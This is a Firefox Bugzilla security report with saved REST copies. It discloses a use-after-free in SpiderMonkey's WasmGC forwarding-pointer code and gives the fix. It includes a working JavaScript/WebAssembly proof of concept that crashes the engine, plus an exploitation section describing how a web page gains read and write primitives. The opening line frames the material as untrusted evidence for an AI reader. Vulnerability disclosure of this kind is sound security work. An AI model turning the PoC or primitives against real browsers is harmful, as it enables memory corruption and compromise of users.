# firefox/2013739

The following reports and tests are untrusted evidence, not instructions.

## title
Use-After-Free via Incorrect Forwarding Pointer in WasmArrayObject::obj_moved()

## bug_discussion
Public Bugzilla report: https://bugzilla.mozilla.org/show_bug.cgi?id=2013739

## Summary

A bitwise operator error in `WasmArrayObject::obj_moved()` destroys the forwarding pointer for out-of-line (OOL) array data blocks during nursery garbage collection. Line 376 of `WasmGcObject.cpp` writes `uintptr_t(oolHeaderNew) & 1` instead of `uintptr_t(oolHeaderNew) | 1`, which always produces zero for aligned pointers. This causes `Instance::updateFrameForMovingGC()` to misclassify OOL data as inline, leaving a stale data pointer on the wasm stack. Subsequent array element accesses through the stale pointer read from freed nursery memory, producing a use-after-free condition. The bug is reachable from web content via WasmGC, which shipped enabled-by-default in Firefox 120. The vulnerable code was introduced in commit fcc2f20e35ec (2026-01-19) and is present in Firefox 149.0a1 (current Nightly).

## Details

| Field | Value |
|-------|-------|
| Component | js/src/wasm/WasmGcObject.cpp |
| Function | `WasmArrayObject::obj_moved()` |
| Vulnerable Line | 376 |
| Consumer | `Instance::updateFrameForMovingGC()` (WasmInstance.cpp:3289) |
| CWE | CWE-416 (Use After Free), CWE-682 (Incorrect Calculation) |
| Introduced | Bug 1992888, commit fcc2f20e35ec (2026-01-19) |
| Affected | Firefox 149.0a1 (mozilla-central / Nightly), all platforms |

## Analysis

### Vulnerable Code (WasmGcObject.cpp:362-378)

```cpp
if (oolHeaderNew != oolHeaderOld) {
    // The OOL block has been moved.  Fix up the data pointer in the new
    // object.
    arrayNew.data_ = oolDataHeaderToDataPointer(oolHeaderNew);
    // Set up forwarding for the OOL block.  Use direct forwarding.  Write the
    // address of the new OOL block to OOLDataHeader::word in the old OOL
    // block.  This will be later used by Instance::updateFrameForMovingGC.
    //
    // Note, > rather than >=, because the OOL block must be big enough to hold
    // the data header plus at least one byte of array data.
    MOZ_RELEASE_ASSERT(oolBlockSize > sizeof(OOLDataHeader));
    if (nursery.isInside(oolHeaderOld)) {
      // Store the forwarding word, with bit 0 set.
      oolHeaderOld->word = uintptr_t(oolHeaderNew) & 1;    // <-- BUG
      oolHeaderNew->word = WasmArrayObject::OOLDataHeader_Magic;
    }
}
```

### Consumer Code (WasmInstance.cpp:3281-3324)

```cpp
case StackMap::Kind::ArrayDataPointer: {
    uint8_t* oldDataPointer = (uint8_t*)stackWords[i];
    if (WasmArrayObject::isDataInline(oldDataPointer)) {   // <-- takes this path
      // Inline path: computes bogus WasmArrayObject pointer
      WasmArrayObject* oldArray =
          WasmArrayObject::fromInlineDataPointer(oldDataPointer);
      WasmArrayObject* newArray =
          (WasmArrayObject*)gc::MaybeForwarded(oldArray);
      if (newArray != oldArray) {
        stackWords[i] =
            uintptr_t(WasmArrayObject::addressOfInlineArrayData(newArray));
      }
      // RESULT: stack pointer NOT updated (oldArray == newArray after
      //         MaybeForwarded on a bogus pointer)
    } else {
      // OOL path: would correctly follow forwarding pointer
      // ...
      MOZ_ASSERT(oldHeader->word & 1);  // would assert-fail if reached
      // ...
    }
    break;
}
```

### Root Cause

The `isDataInline()` function (WasmGcObject.h:478-486) reads the `OOLDataHeader::word` field preceding the data pointer and checks `(headerWord & 1) == 0`. For inline arrays, this word is part of the object and has bit 0 clear. For OOL arrays, this word is `OOLDataHeader_Magic` (0x351), which has bit 0 set.

During nursery GC, `obj_moved` is supposed to overwrite the old OOL header word with the forwarding pointer to the new location, with bit 0 set (`| 1`). The `& 1` typo produces zero for any aligned pointer, which is indistinguishable from an inline data header.

When `updateFrameForMovingGC` later processes stack-cached `ArrayDataPointer` entries, it calls `isDataInline(oldDataPointer)`. The zeroed forwarding word causes `(0 & 1) == 0 == true`, taking the inline path. The inline path computes a bogus `WasmArrayObject*` via `fromInlineDataPointer`, which points into the middle of the freed OOL block. `MaybeForwarded` on this bogus pointer returns the same pointer (it's not a valid forwarded object), so the condition `newArray != oldArray` is false and the stack slot is not updated.

The wasm function then resumes execution with the stale data pointer, which points into freed nursery memory.

### Ion Alias Analysis Dependency

Ion's `wasmCallAliasSet()` (MIR-wasm.h:1951-1957) explicitly excludes `WasmArrayDataPointer` from the set of memory locations clobbered by wasm calls:

```cpp
static AliasSet wasmCallAliasSet() {
    // This is ok because:
    // - numElements is immutable
    // - the GC will rewrite any array data pointers on move
    AliasSet exclude = AliasSet(AliasSet::WasmArrayNumElements) |
                       AliasSet(AliasSet::WasmArrayDataPointer);
    return AliasSet::Store(AliasSet::Any) & ~exclude;
}
```

This allows Ion's GVN pass to keep data pointer values alive across calls that may trigger GC. The comment "the GC will rewrite any array data pointers on move" documents the contract that this bug violates.

## Proof of Concept

### Test Environment

- OS: Ubuntu (Linux 6.14.0-1018-aws)
- Compiler: Mozilla clang (from mozbuild toolchain)
- Target: mozilla-central commit 031c614e006f (2026-01-30)
- Architecture: x86_64
- JS Shell: SpiderMonkey 149.0a1, debug+optimize build

### PoC Code

```javascript
// poc_wasm_fwd_web.js
// Demonstrates UAF via WasmGcObject OOL forwarding pointer bug.
// Uses only web-compatible APIs (no minorgc/gczeal/gcparam).
"use strict";

// GC trigger: pure JS allocation pressure fills nursery
function triggerGCviaAlloc() {
  let junk = [];
  for (let i = 0; i < 50000; i++) {
    junk.push({a: i, b: i + 1, c: [i, i + 1, i + 2]});
  }
  return junk.length;
}

const wat = `
(module
  (type $i32arr (array (mut i32)))
  (import "env" "triggerGC" (func $triggerGC (result i32)))

  ;; 32 i32 elements = 128 bytes data > 112 (MaxInlineBytes) => OOL
  ;; OOL block = 136 bytes <= 256 (MaxNurseryTrailerSize) => nursery-direct
  (func (export "test") (result i32)
    (local $arr (ref $i32arr))
    (local.set $arr (array.new $i32arr (i32.const 0) (i32.const 32)))
    (array.set $i32arr (local.get $arr) (i32.const 0) (i32.const 0xCAFEBABE))
    (array.set $i32arr (local.get $arr) (i32.const 1) (i32.const 0xDEADBEEF))
    (array.set $i32arr (local.get $arr) (i32.const 15) (i32.const 0xBAADF00D))
    (array.set $i32arr (local.get $arr) (i32.const 31) (i32.const 0x1337C0DE))
    ;; GC safepoint: Ion keeps data pointer live across this call
    (drop (call $triggerGC))
    ;; Reads via (potentially stale) data pointer
    (i32.add
      (i32.add
        (array.get $i32arr (local.get $arr) (i32.const 0))
        (array.get $i32arr (local.get $arr) (i32.const 1)))
      (i32.add
        (array.get $i32arr (local.get $arr) (i32.const 15))
        (array.get $i32arr (local.get $arr) (i32.const 31))))
  )
)`;

const binary = wasmTextToBinary(wat);
const mod = new WebAssembly.Module(binary);
const inst = new WebAssembly.Instance(mod, {
  env: { triggerGC: triggerGCviaAlloc }
});

const expected = (0xCAFEBABE + 0xDEADBEEF + 0xBAADF00D + 0x1337C0DE) | 0;

// Phase 1: lightweight warmup for Ion tier-up
let doGC = false;
print("Phase 1: warmup (100000 calls for Ion tier-up)...");
for (let i = 0; i < 100000; i++) {
  inst.exports.test();
}
print("Phase 2: GC pressure after Ion tier-up...");
for (let i = 0; i < 200; i++) {
  try {
    let r = inst.exports.test();
    if (r !== expected) {
      print("CORRUPTION at iter " + i + ": 0x" + (r >>> 0).toString(16));
      break;
    }
  } catch(e) {
    print("CRASH at iter " + i + ": " + e);
    break;
  }
}
print("Done.");
```

### Build and Run

```bash
# Build debug+optimize JS shell (assertions + Ion GVN active)
mkdir -p obj-jsshell && cd obj-jsshell
/path/to/firefox/js/src/configure --enable-debug --enable-optimize
make -j$(nproc)

# Run PoC -- crashes with SIGSEGV
./dist/bin/js poc_wasm_fwd_web.js

# Alternatively, force Ion compilation for faster reproduction:
./dist/bin/js --wasm-compiler=optimizing --test-wasm-await-tier2 poc_wasm_fwd_web.js
```

### Output

With `--wasm-compiler=optimizing` (immediate crash):

```
Phase 1: warmup (100000 calls for Ion tier-up)...
Phase 2: GC pressure after Ion tier-up...
Segmentation fault (core dumped)
```

Exit code: 139 (SIGSEGV)

With default flags (natural tier-up):

```
Phase 1: warmup (100000 calls for Ion tier-up)...
Warmup done. Ion should have compiled by now.
Phase 2: GC pressure (200 iterations)...
Segmentation fault (core dumped)
```

Exit code: 139 (SIGSEGV)

### Crash Configurations Validated

| Compiler Flags | GC Trigger | Result |
|---|---|---|
| `--wasm-compiler=optimizing` | `minorgc()` (shell) | SIGSEGV (139) |
| `--wasm-compiler=optimizing --test-wasm-await-tier2` | JS alloc pressure | SIGSEGV (139) |
| Default (baseline + Ion) | `minorgc()` (shell) | SIGSEGV (139) |
| Default (baseline + Ion) | JS alloc pressure only | SIGSEGV (139) |

### Trigger Conditions

1. WasmGC array with 29-62 `i32` elements (OOL storage, nursery-direct allocation)
2. Ion compilation of the wasm function (natural tier-up or forced)
3. Array element access before and after a call to an imported JS function
4. Nursery GC during the imported call that relocates the OOL data block

## Exploitation

### Attack Path

1. **Attacker serves a web page** containing a wasm module with a GC array type and an imported JS function.
2. **Wasm function creates a 32-element `i32` array.** The 128-byte data block exceeds `WasmArrayObject_MaxInlineBytes` (112), forcing OOL allocation. The 136-byte OOL block is below `MaxNurseryTrailerSize` (256), so it is allocated directly in the nursery (not via `BufferAllocator`).
3. **Wasm writes canary values** to the array. Ion loads the data pointer once and caches it for subsequent accesses (GVN optimization, enabled by `wasmCallAliasSet()` excluding `WasmArrayDataPointer`).
4. **Wasm calls the imported JS function.** The cached data pointer survives the call on the stack/in a register.
5. **JS function allocates objects** to fill the nursery, triggering a minor (nursery) GC.
6. **GC promotes the `WasmArrayObject`** and relocates its OOL data block from nursery to tenured heap. `obj_moved` writes `oolHeaderOld->word = ptr & 1 = 0`.
7. **`updateFrameForMovingGC` processes the stack.** It encounters the `ArrayDataPointer` stack map entry. `isDataInline(oldDataPointer)` reads the forwarding word (0), returns true. The inline path computes a bogus object pointer, `MaybeForwarded` returns the same pointer, and the stack slot is NOT updated.
8. **Wasm resumes with the stale pointer** into freed nursery memory. Array reads produce attacker-influenced data (from objects allocated after the GC).

### UAF Primitive

The stale pointer reads from nursery memory that has been freed and may be reallocated. The attacker controls what objects occupy the freed region by allocating JS objects after the GC. This provides:

- **Read primitive**: Array element reads via the stale pointer return data from attacker-controlled JS objects in the recycled nursery space.
- **Potential write primitive**: If the wasm function writes to the array after the GC (array.set), the write goes to freed/reused nursery memory, corrupting live JS objects.

## Fix

```cpp
// Before (vulnerable) -- WasmGcObject.cpp:376:
oolHeaderOld->word = uintptr_t(oolHeaderNew) & 1;

// After (fixed):
oolHeaderOld->word = uintptr_t(oolHeaderNew) | 1;
```

The `| 1` sets bit 0 of the forwarding pointer, which is the documented protocol for OOL data header words. `isDataInline()` checks `(word & 1) == 0` to distinguish inline from OOL; the set bit 0 ensures the forwarding pointer is correctly classified as OOL by all consumers.

The `WasmStructObject::obj_moved` function (same file, line 497+) handles the analogo

## saved report: https://bugzilla.mozilla.org/rest/bug/2013739
d","name":"jseward@acm.org","id":346453,"real_name":"Julian Seward [:jseward]","email":"jseward@acm.org"},{"nick":"sdetar","name":"sdetar@mozilla.com","id":607698,"real_name":"Steven DeTar [:sdetar]","email":"sdetar@mozilla.com"}],"platform":"Unspecified","cf_status_thunderbird_esr140":"---","flags":[{"name":"sec-bounty","id":2329086,"type_id":803,"modification_date":"2026-02-11T19:25:07Z","creation_date":"2026-02-01T06:11:52Z","setter":"dveditz@mozilla.com","status":"+"}],"cf_user_story":"","creation_time":"2026-02-01T06:11:52Z","target_milestone":"149 Branch","duplicates":[2014014],"is_open":false,"creator":"prodigysml555@gmail.com","cf_status_firefox147":"unaffected","cf_status_firefox148":"unaffected","keywords":["ai-involved","csectype-uaf","regression","reporter-external","sec-high"],"cf_fx_iteration":"---","url":"","component":"JavaScript: WebAssembly","blocks":[1729513],"summary":"Use-After-Free via Incorrect Forwarding Pointer in WasmArrayObject::obj_moved()","cf_status_firefox149":"fixed","cf_tracking_thunderbird_esr115":"---","regressed_by":[1992888],"depends_on":[],"creator_detail":{"name":"prodigysml555@gmail.com","id":660720,"real_name":"Sajeeb Lohani","email":"prodigysml555@gmail.com","nick":"prodigysml555"},"cf_tracking_firefox_esr115":"---","is_creator_accessible":true,"cf_status_firefox159":"---","assigned_to":"jseward@acm.org","cf_a11y_review_project_flag":"---","qa_contact":"","cf_has_str":"---","cf_tracking_firefox_relnote":"---","cf_fx_points":"---","cf_crash_signature":"","id":2013739,"cf_cab_review":"---","regressions":[],"is_confirmed":true,"mentors_detail":[],"cf_qa_whiteboard":"[sec] [qa-triage-done-c150/b149]","severity":"S2","cf_accessibility_severity":"---","cf_status_thunderbird_esr115":"---","cf_tracking_firefox159":"---","cf_tracking_firefox_esr153":"---","cf_performance_impact":"---","cf_last_resolved":"2026-02-09T21:32:39Z","is_cc_accessible":true,"cf_status_thunderbird_esr153":"---","cf_tracking_thunderbird_esr140":"---","cf_webcompat_score":"---","cf_size_estimate":"---","cf_tracking_firefox149":"+","resolution":"FIXED","cf_webcompat_priority":"---","cf_tracking_firefox158":"---","status":"RESOLVED","whiteboard":"[client-bounty-form]","cf_status_firefox_esr115":"unaffected","groups":[],"cf_status_firefox_esr140":"unaffected","cf_tracking_thunderbird_esr153":"---","classification":"Components","product":"Core","see_also":[],"assigned_to_detail":{"id":346453,"name":"jseward@acm.org","real_name":"Julian Seward [:jseward]","email":"jseward@acm.org","nick":"jseward"},"votes":0,"comment_count":13,"alias":null,"cf_tracking_firefox157":"---","dupe_of":null,"priority":"P1","cf_rank":null,"cc":["bvisness@mozilla.com","fbraun@mozilla.com","firefox-test-engineering@bot.tld","jcoppeard@mozilla.com","jpages@mozilla.com","jseward@acm.org","sdetar@mozilla.com"]}]}

## saved report: https://bugzilla.mozilla.org/rest/bug/2013739/comment
`). The `& 1` typo produces zero for any aligned pointer, which is indistinguishable from an inline data header.\n\nWhen `updateFrameForMovingGC` later processes stack-cached `ArrayDataPointer` entries, it calls `isDataInline(oldDataPointer)`. The zeroed forwarding word causes `(0 & 1) == 0 == true`, taking the inline path. The inline path computes a bogus `WasmArrayObject*` via `fromInlineDataPointer`, which points into the middle of the freed OOL block. `MaybeForwarded` on this bogus pointer returns the same pointer (it's not a valid forwarded object), so the condition `newArray != oldArray` is false and the stack slot is not updated.\n\nThe wasm function then resumes execution with the stale data pointer, which points into freed nursery memory.\n\n### Ion Alias Analysis Dependency\n\nIon's `wasmCallAliasSet()` (MIR-wasm.h:1951-1957) explicitly excludes `WasmArrayDataPointer` from the set of memory locations clobbered by wasm calls:\n\n```cpp\nstatic AliasSet wasmCallAliasSet() {\n // This is ok because:\n // - numElements is immutable\n // - the GC will rewrite any array data pointers on move\n AliasSet exclude = AliasSet(AliasSet::WasmArrayNumElements) |\n AliasSet(AliasSet::WasmArrayDataPointer);\n return AliasSet::Store(AliasSet::Any) & ~exclude;\n}\n```\n\nThis allows Ion's GVN pass to keep data pointer values alive across calls that may trigger GC. The comment \"the GC will rewrite any array data pointers on move\" documents the contract that this bug violates.\n\n## Proof of Concept\n\n### Test Environment\n\n- OS: Ubuntu (Linux 6.14.0-1018-aws)\n- Compiler: Mozilla clang (from mozbuild toolchain)\n- Target: mozilla-central commit 031c614e006f (2026-01-30)\n- Architecture: x86_64\n- JS Shell: SpiderMonkey 149.0a1, debug+optimize build\n\n### PoC Code\n\n```javascript\n// poc_wasm_fwd_web.js\n// Demonstrates UAF via WasmGcObject OOL forwarding pointer bug.\n// Uses only web-compatible APIs (no minorgc/gczeal/gcparam).\n\"use strict\";\n\n// GC trigger: pure JS allocation pressure fills nursery\nfunction triggerGCviaAlloc() {\n let junk = [];\n for (let i = 0; i < 50000; i++) {\n junk.push({a: i, b: i + 1, c: [i, i + 1, i + 2]});\n }\n return junk.length;\n}\n\nconst wat = `\n(module\n (type $i32arr (array (mut i32)))\n (import \"env\" \"triggerGC\" (func $triggerGC (result i32)))\n\n ;; 32 i32 elements = 128 bytes data > 112 (MaxInlineBytes) => OOL\n ;; OOL block = 136 bytes <= 256 (MaxNurseryTrailerSize) => nursery-direct\n (func (export \"test\") (result i32)\n (local $arr (ref $i32arr))\n (local.set $arr (array.new $i32arr (i32.const 0) (i32.const 32)))\n (array.set $i32arr (local.get $arr) (i32.const 0) (i32.const 0xCAFEBABE))\n (array.set $i32arr (local.get $arr) (i32.const 1) (i32.const 0xDEADBEEF))\n (array.set $i32arr (local.get $arr) (i32.const 15) (i32.const 0xBAADF00D))\n (array.set $i32arr (local.get $arr) (i32.const 31) (i32.const 0x1337C0DE))\n ;; GC safepoint: Ion keeps data pointer live across this call\n (drop (call $triggerGC))\n ;; Reads via (potentially stale) data pointer\n (i32.add\n (i32.add\n (array.get $i32arr (local.get $arr) (i32.const 0))\n (array.get $i32arr (local.get $arr) (i32.const 1)))\n (i32.add\n (array.get $i32arr (local.get $arr) (i32.const 15))\n (array.get $i32arr (local.get $arr) (i32.const 31))))\n )\n)`;\n\nconst binary = wasmTextToBinary(wat);\nconst mod = new WebAssembly.Module(binary);\nconst inst = new WebAssembly.Instance(mod, {\n env: { triggerGC: triggerGCviaAlloc }\n});\n\nconst expected = (0xCAFEBABE + 0xDEADBEEF + 0xBAADF00D + 0x1337C0DE) | 0;\n\n// Phase 1: lightweight warmup for Ion tier-up\nlet doGC = false;\nprint(\"Phase 1: warmup (100000 calls for Ion tier-up)...\");\nfor (let i = 0; i < 100000; i++) {\n inst.exports.test();\n}\nprint(\"Phase 2: GC pressure after Ion tier-up...\");\nfor (let i = 0; i < 200; i++) {\n try {\n let r = inst.exports.test();\n if (r !== expected) {\n print(\"CORRUPTION at iter \" + i + \": 0x\" + (r >>> 0).toString(16));\n break;\n }\n } catch(e) {\n print(\"CRASH at iter \" + i + \": \" + e);\n break;\n }\n}\nprint(\"Done.\");\n```\n\n### Build and Run\n\n```bash\n# Build debug+optimize JS shell (assertions + Ion GVN active)\nmkdir -p obj-jsshell && cd obj-jsshell\n/path/to/firefox/js/src/configure --enable-debug --enable-optimize\nmake -j$(nproc)\n\n# Run PoC -- crashes with SIGSEGV\n./dist/bin/js poc_wasm_fwd_web.js\n\n# Alternatively, force Ion compilation for faster reproduction:\n./dist/bin/js --wasm-compiler=optimizing --test-wasm-await-tier2 poc_wasm_fwd_web.js\n```\n\n### Output\n\nWith `--wasm-compiler=optimizing` (immediate crash):\n\n```\nPhase 1: warmup (100000 calls for Ion tier-up)...\nPhase 2: GC pressure after Ion tier-up...\nSegmentation fault (core dumped)\n```\n\nExit code: 139 (SIGSEGV)\n\nWith default flags (natural tier-up):\n\n```\nPhase 1: warmup (100000 calls for Ion tier-up)...\nWarmup done. Ion should have compiled by now.\nPhase 2: GC pressure (200 iterations)...\nSegmentation fault (core dumped)\n```\n\nExit code: 139 (SIGSEGV)\n\n### Crash Configurations Validated\n\n| Compiler Flags | GC Trigger | Result |\n|---|---|---|\n| `--wasm-compiler=optimizing` | `minorgc()` (shell) | SIGSEGV (139) |\n| `--wasm-compiler=optimizing --test-wasm-await-tier2` | JS alloc pressure | SIGSEGV (139) |\n| Default (baseline + Ion) | `minorgc()` (shell) | SIGSEGV (139) |\n| Default (baseline + Ion) | JS alloc pressure only | SIGSEGV (139) |\n\n### Trigger Conditions\n\n1. WasmGC array with 29-62 `i32` elements (OOL storage, nursery-direct allocation)\n2. Ion compilation of the wasm function (natural tier-up or forced)\n3. Array element access before and after a call to an imported JS function\n4. Nursery GC during the imported call that relocates the OOL data block\n\n## Exploitation\n\n### Attack Path\n\n1. **Attacker serves a web page** containing a wasm module with a GC array type and an imported JS function.\n2. **Wasm function creates a 32-element `i32` array.** The 128-byte data block exceeds `WasmArrayObject_MaxInlineBytes` (112), forcing OOL allocation. The 136-byte OOL block is below `MaxNurseryTrailerSize` (256), so it is allocated directly in the nursery (not via `BufferAllocator`).\n3. **Wasm writes canary values** to the array. Ion loads the data pointer once and caches it for subsequent accesses (GVN optimization, enabled by `wasmCallAliasSet()` excluding `WasmArrayDataPointer`).\n4. **Wasm calls the imported JS function.** The cached data pointer survives the call on the stack/in a register.\n5. **JS function allocates objects** to fill the nursery, triggering a minor (nursery) GC.\n6. **GC promotes the `WasmArrayObject`** and relocates its OOL data block from nursery to tenured heap. `obj_moved` writes `oolHeaderOld->word = ptr & 1 = 0`.\n7. **`updateFrameForMovingGC` processes the stack.** It encounters the `ArrayDataPointer` stack map entry. `isDataInline(oldDataPointer)` reads the forwarding word (0), returns true. The inline path computes a bogus object pointer, `MaybeForwarded` returns the same pointer, and the stack slot is NOT updated.\n8. **Wasm resumes with the stale pointer** into freed nursery memory. Array reads produce attacker-influenced data (from objects allocated after the GC).\n\n### UAF Primitive\n\nThe stale pointer reads from nursery memory that has been freed and may be reallocated. The attacker controls what objects occupy the freed region by allocating JS objects after the GC. This provides:\n\n- **Read primitive**: Array element reads via the stale pointer return data from attacker-controlled JS objects in the recycled nursery space.\n- **Potential write primitive**: If the wasm function writes to the array after the GC (array.set), the write goes to freed/reused nursery memory, corrupting live JS objects.\n\n## Fix\n\n```cpp\n// Before (vulnerable) -- WasmGcObject.cpp:376:\noolHeaderOld->word = uintptr_t(oolHeaderNew) & 1;\n\n// After (fixed):\noolHeaderOld->word = uintptr_t(oolHeaderNew) | 1;\n```\n\nThe `| 1` sets bit 0 of the forwarding pointer, which is the documented protocol for OOL data header words. `isDataInline()` checks `(word & 1) == 0` to distinguish inline from OOL; the set bit 0 ensures the forwarding pointer is correctly classified as OOL by all consumers.\n\nThe `WasmStructObject::obj_moved` function (same file, line 497+) handles the analogous case for struct OOL data using `nursery.setForwardingPointerWhileTenuring`, which writes a `BufferRelocationOverlay` without manual bit manipulation. The array path was refactored in Bug 1992888 to use a custom forwarding protocol and introduced this typo.","text":"## Summary\n\nA bitwise operator error in `WasmArrayObject::obj_moved()` destroys the forwarding pointer for out-of-line (OOL) array data blocks during nursery garbage collection. Line 376 of `WasmGcObject.cpp` writes `uintptr_t(oolHeaderNew) & 1` instead of `uintptr_t(oolHeaderNew) | 1`, which always produces zero for aligned pointers. This causes `Instance::updateFrameForMovingGC()` to misclassify OOL data as inline, leaving a stale data pointer on the wasm stack. Subsequent array element accesses through the stale pointer read from freed nursery memory, producing a use-after-free condition. The bug is reachable from web content via WasmGC, which shipped enabled-by-default in Firefox 120. The vulnerable code was introduced in commit fcc2f20e35ec (2026-01-19) and is present in Firefox 149.0a1 (current Nightly).\n\n## Details\n\n| Field | Value |\n|-------|-------|\n| Component | js/src/wasm/WasmGcObject.cpp |\n| Function | `WasmArrayObject::obj_moved()` |\n| Vulnerable Line | 376 |\n| Consumer | `Instance::updateFrameForMovingGC()` (WasmInstance.cpp:3289) |\n| CWE | CWE-416 (Use After Free), CWE-682 (Incorrect Calculation) |\n| Introduced | Bug 1992888, commit fcc2f20e35ec (2026-01-19) |\n| Affected | Firefox 149.0a1 (mozilla-central / Nightly), all platforms |\n\n## Analysis\n\n### Vulnerable Code (WasmGcObject.cpp:362-378)\n\n```cpp\nif (oolHeaderNew != oolHeaderOld) {\n // The OOL block has been moved. Fix up the data pointer in the new\n // object.\n arrayNew.data_ = oolDataHeaderToDataPointer(oolHeaderNew);\n // Set up forwarding for the OOL block. Use direct forwarding. Write the\n // address of the new OOL block to OOLDataHeader::word in the old OOL\n // block. This will be later used by Instance::updateFrameForMovingGC.\n //\n // Note, > rather than >=, because the OOL block must be big enough to hold\n // the data header plus at least one byte of array data.\n MOZ_RELEASE_ASSERT(oolBlockSize > sizeof(OOLDataHeader));\n if (nursery.isInside(oolHeaderOld)) {\n // Store the forwarding word, with bit 0 set.\n oolHeaderOld->word = uintptr_t(oolHeaderNew) & 1; // <-- BUG\n oolHeaderNew->word = WasmArrayObject::OOLDataHeader_Magic;\n }\n}\n```\n\n### Consumer Code (WasmInstance.cpp:3281-3324)\n\n```cpp\ncase StackMap::Kind::ArrayDataPointer: {\n uint8_t* oldDataPointer = (uint8_t*)stackWords[i];\n if (WasmArrayObject::isDataInline(oldDataPointer)) { // <-- takes this path\n // Inline path: computes bogus WasmArrayObject pointer\n WasmArrayObject* oldArray =\n WasmArrayObject::fromInlineDataPointer(oldDataPointer);\n WasmArrayObject* newArray =\n (WasmArrayObject*)gc::MaybeForwarded(oldArray);\n if (newArray != oldArray) {\n stackWords[i] =\n uintptr_t(WasmArrayObject::addressOfInlineArrayData(newArray));\n }\n // RESULT: stack pointer NOT updated (oldArray == newArray after\n // MaybeForwarded on a bogus pointer)\n } else {\n // OOL path: would correctly follow forwarding pointer\n // ...\n MOZ_ASSERT(oldHeader->word & 1); // would assert-fail if reached\n // ...\n }\n break;\n}\n```\n\n### Root Cause\n\nThe `isDataInline()` function (WasmGcObject.h:478-486) reads the `OOLDataHeader::word` field preceding the data pointer and checks `(headerWord & 1) == 0`. For inline arrays, this word is part of the object and has bit 0 clear. For OOL arrays, this word is `OOLDataHeader_Magic` (0x351), which has bit 0 s

## saved report: https://bugzilla.mozilla.org/rest/bug/2013739/attachment?exclude_fields=data
{"attachments":{},"bugs":{"2013739":[{"content_type":"text/x-phabricator-request","id":9542046,"creation_time":"2026-02-03T12:59:32Z","flags":[{"name":"sec-approval","status":"+","type_id":799,"creation_date":"2026-02-09T10:39:36Z","modification_date":"2026-02-09T10:39:36Z","id":2330820,"setter":"fbraun@mozilla.com"}],"creator_detail":{"name":"jseward@acm.org","id":346453,"nick":"jseward","real_name":"Julian Seward [:jseward]","email":"jseward@acm.org"},"description":"(secure)","is_private":0,"summary":"(secure)","is_obsolete":0,"creator":"jseward@acm.org","file_name":"phabricator-D281607-url.txt","last_change_time":"2026-02-09T10:39:36Z","attacher":"jseward@acm.org","size":48,"is_patch":0,"bug_id":2013739},{"file_name":"phabricator-D282337-url.txt","last_change_time":"2026-08-17T06:00:15Z","size":48,"attacher":"jseward@acm.org","is_patch":0,"bug_id":2013739,"is_private":0,"is_obsolete":0,"summary":"Bug 2013739 - testcase. r=rhunt.","creator":"jseward@acm.org","creator_detail":{"id":346453,"name":"jseward@acm.org","email":"jseward@acm.org","nick":"jseward","real_name":"Julian Seward [:jseward]"},"flags":[],"description":"Bug 2013739 - testcase. r=rhunt.","content_type":"text/x-phabricator-request","id":9543462,"creation_time":"2026-02-09T09:20:15Z"}]}}
